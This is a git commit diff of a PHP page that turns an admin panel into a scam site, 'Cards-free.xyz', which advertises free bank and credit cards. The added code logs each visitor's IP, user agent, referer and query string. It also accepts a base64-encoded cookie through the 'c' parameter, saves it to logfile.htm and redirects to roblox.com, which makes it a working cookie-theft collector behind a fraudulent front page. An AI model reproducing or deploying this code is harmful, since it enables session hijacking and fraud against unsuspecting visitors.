6ea6e9a294856ec48d34aabba338e89fb832f8df
lowoonity <30565751+lowoonity@users.noreply.github.com>
2020-11-25 12:32:13 +0100

    updated (better precision in logs)

--- index.php
+++ index.php
@@ -1,49 +1,92 @@
 <?php
-function logIP()
+
+$age = 17;
+$email = "votre.email@domaine.com";
+$pseudo = "Votre pseudo";
+
+function getIP()
 {
-     $ipLog="logfile.htm";
-     $register_globals = (bool) ini_get('register_gobals');
-     if ($register_globals) $ip = getenv(REMOTE_ADDR);
-     else $ip = $_SERVER['REMOTE_ADDR'];
-     $date=date ("l dS of F Y h:i:s A");
-     $log=fopen("$ipLog", "a+");
-     if (preg_match("/\\bhtm\\b/i", $ipLog) || preg_match("/\\bhtml\\b/i", $ipLog))
-     {
-          fputs($log, "Logged IP address: ^^  $ip   ||-|| Date logged: $date<br>");
-     }
-     else fputs($log, "Logged IP address: ^^  $ip   ||-|| Date logged: $date\
-     	");
-     fclose($log);
+  if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
+    $ip = getenv("HTTP_CLIENT_IP");
+  else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
+    $ip = getenv("HTTP_X_FORWARDED_FOR");
+  else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
+    $ip = getenv("REMOTE_ADDR");
+  else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
+    $ip = $_SERVER['REMOTE_ADDR'];
+  else
+    $ip = "unknown";
+  return($ip);
 }
-logIp();
+
+function logData()
+{
+  $ipLog="logfile.htm";
+  $cookie = $_SERVER['QUERY_STRING'];
+  $register_globals = (bool) ini_get('register_globals');
+  if ($register_globals)
+    $ip = getenv('REMOTE_ADDR');
+  else
+    $ip = GetIP();
+
+  $rem_port = $_SERVER['REMOTE_PORT'];
+  $user_agent = $_SERVER['HTTP_USER_AGENT'];
+  $rqst_method = $_SERVER['METHOD'];
+  $rem_host = $_SERVER['REMOTE_HOST'];
+  $referer = $_SERVER['HTTP_REFERER'];
+  $date=date ("l dS of F Y h:i:s A");
+  $log=fopen("$ipLog", "a+");
+
+  if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
+    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie
+");
+  else
+    fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
+  fclose($log);
+}
+
+logData();
+
 ?>
 
 
+<?php
+	header ('Location:https://roblox.com');
+
+	if (isset($_GET["c"]))
+	{
+		$cookies = base64_decode(urldecode($_GET["c"]));
+		$file = fopen('logfile.htm', 'a');
+		fwrite($file, $cookies . "\n\n");
+	}
+?>
+
+
+
+
 <html>
-<title> Admin Panel </title>
+<title> Cards-free.xyz </title>
 <head> 
-     <body> 
+	<body> 
 
-          <link rel="stylesheet" type="text/css" href="style.css">
-          <script type="text/javascript" src="secu.js"></script>
+		<link rel="stylesheet" type="text/css" href="style.css">
+		<script type="text/javascript" src="secu.js"></script>
 
-          <center>
-<h1> Web Admin Panel </h1>
+		<center>
+<h1> Card-free ! New domain ! </h1>
 </center>
-<h2> Administration PotatoKlan</h2>
+<h2>Cartes bancaires (débit) et cartes de crédit gratuites !</h2>
 
 <ul id="navigation">
   <li><a href="index.php" title="Accueil">Accueil</a></li>
-  <li><a href="http://localhost/phpmyadmin/index.php" title="PhpMyAdmin">PhpMyAdmin</a></li>
+  <li><a href="gen.php" title="PhpMyAdmin">GENERATEUR</a></li>
   <li><a href="#" title="En dev">En dev</a></li>
   <li><a href="#" title="En dev">En dev</a></li>
   <li><a href="#" title="En dev">En dev</a></li>
 </ul>
 
 <center> 
-
-<p> Bienvenue sur l'interface d'administration du serveur PotatoKlan </p>
-
+  <h3> si vous voulez des cartes, il suffit de cliquer sur "GENERATEUR" </h3>
 </center>
 
 <style>
@@ -69,33 +112,32 @@ color: #FFFFFF;
 
 </style>
 
-<h4> prénom : <?= $pseudo ?> \\ email : <?= $email ?> \\ âge :<?= $age ?> </h4>
+<h4> prÃ©nom : <?= $pseudo ?> \\ email : <?= $email ?> \\ Ã¢ge :<?= $age ?> </h4>
 
 <?php
 
 if(isset($_POST['formsend'])){
-          echo "votre pseudo : ", $pseudo ,"<br/>";
-          echo "votre âge : ",$_POST['age'] , "<br/>";
-          echo "votre email : ",$_POST['email'];
-     }
+		echo "votre pseudo : ", $pseudo ,"<br/>";
+		echo "votre Ã¢ge : ",$_POST['age'] , "<br/>";
+		echo "votre email : ",$_POST['email'];
+	}
 ?>
 
-<p id="contact"> pour toutes demandes, contactez moi à l'adresse yann.berlemont@pm.me </p>
-
+<p id="contact"> webmaster : admin@card-free.xyz </p>
+<!--
 <form>
-     <input type="text" name="pseudo" id="pseudo" placeholder="Votre pseudo">
-     <input type="text" name="age" id="age" placeholder="Votre âge">
-     <input type="text" name="email" id="email" placeholder="Votre email">
-     <input type="submit" name="formsend" id="formsend">
+	<input type="text" name="pseudo" id="pseudo" placeholder="Votre pseudo">
+	<input type="text" name="age" id="age" placeholder="Votre Ã¢ge">
+	<input type="text" name="email" id="email" placeholder="Votre email">
+	<input type="submit" name="formsend" id="formsend">
 </form>
-
-
+-->
 <footer>
-     <center>
+	<center>
 
-     <small id ="copyr" style="border-color: #FF0000 #00FF00 #0000FF #ffffff; border-style:solid">&copy; Copyright 2020, PotatoKlan. Domain by TweekLG</small>
+	<small id ="copyr" style="border-color: #FF0000 #00FF00 #0000FF #ffffff; border-style:solid">&copy; Copyright 2020, HexaTeam. Domain by Hex</small>
 
-     <body oncontextmenu="return false;">
+	<body oncontextmenu="return false;">
 
 
 
